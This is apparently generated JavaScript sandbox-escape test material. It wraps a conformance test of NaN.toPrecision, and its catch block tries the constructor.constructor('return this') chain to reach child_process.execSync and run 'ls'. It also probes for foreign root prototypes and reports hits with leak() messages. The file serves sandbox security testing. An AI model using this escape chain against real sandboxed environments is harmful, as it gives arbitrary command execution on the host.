try {
    assert.sameValue(NaN.toPrecision(undefined), 'NaN', 'step 2: If precision is undefined, return ! ToString(x)');
    var calls = 0;
    var p = {
        valueOf: function () {
            throw () => {
                return () => {
                };
            };
            calls++;
            return Infinity;
        }
    };
    assert.sameValue(NaN.toPrecision(p), 'NaN', 'value');
    assert.sameValue(calls, 1, 'NaN is checked after ToInteger(precision)');
    var n = new Number(NaN);
    calls = 0;
    assert.sameValue(n.toPrecision(p), 'NaN', 'object');
    assert.sameValue(calls, 1, 'Number NaN is checked after ToInteger(precision)');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}